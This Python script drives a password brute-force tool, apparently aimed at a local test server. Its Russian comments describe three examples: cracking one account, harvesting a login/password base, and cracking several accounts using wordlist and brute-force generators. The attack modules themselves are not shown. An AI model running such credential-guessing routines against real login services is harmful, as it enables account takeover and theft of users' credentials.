import generators
import logics
import queries

# пример взлома одного аккаунта
logics.basic_logic(
    login_generator=generators.BasicLoginsGenerator(),
    password_generator=generators.FileLinesGenerator(filename='p.txt'),
    query=queries.request_local_server
)

# пример для сбора базы логинов и паролей
logics.password_then_login_logic(
    login_generator=generators.FileLinesGenerator(filename='p.txt'),
    password_generator=generators.FileLinesGenerator(filename='p.txt'),
    query=queries.request_local_server
)

# Пример взлома нескольких аккаунтов
logics.login_then_password_logic(
    login_generator=generators.BasicLoginsGenerator(),
    password_generator=generators.BruteForceGenerator,
    query=queries.request_local_server
)